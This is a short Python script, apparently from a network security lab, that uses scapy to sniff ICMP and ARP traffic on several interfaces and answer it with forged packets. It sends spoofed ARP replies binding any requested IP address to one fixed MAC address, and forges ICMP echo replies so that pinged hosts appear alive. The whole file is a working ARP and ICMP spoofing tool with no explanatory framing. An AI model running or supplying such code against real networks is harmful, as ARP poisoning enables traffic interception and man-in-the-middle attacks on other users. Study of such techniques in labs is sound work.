#!usr/bin/env python3
from scapy.all import *
MAC = '08:00:27:54:ca:95'
def get_and_send_pkt(pkt):
	if ARP in pkt and pkt[ARP].op:	
		send(ARP(op=2, psrc=pkt[ARP].pdst, hwdst=MAC, pdst=pkt[ARP].psrc), verbose=0)		
	elif pkt[ICMP] is not None:
		if pkt[ICMP].type == 8: # if it is echo request
			print('Packet sniffed')
			print('Source:', pkt[IP].src, 'Destination:', pkt[IP].dst) 
			a = IP()
			a.src = pkt[IP].dst # sets source to the X which user pings
			a.dst = pkt[IP].src # sets destination to the user
			# configuring the echo reply with sniffed pkt information
			b = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
			p = a/b/pkt[Raw].load
			send(p, verbose=0)
			print('Reply send to:', pkt[IP].src, 'as:', pkt[IP].dst)
			print('=====')
			
ifaces = ['br-82d5b13c1347', 'enp0s3', 'lo']
pkt = sniff(iface=ifaces, filter='icmp or arp', prn=get_and_send_pkt)
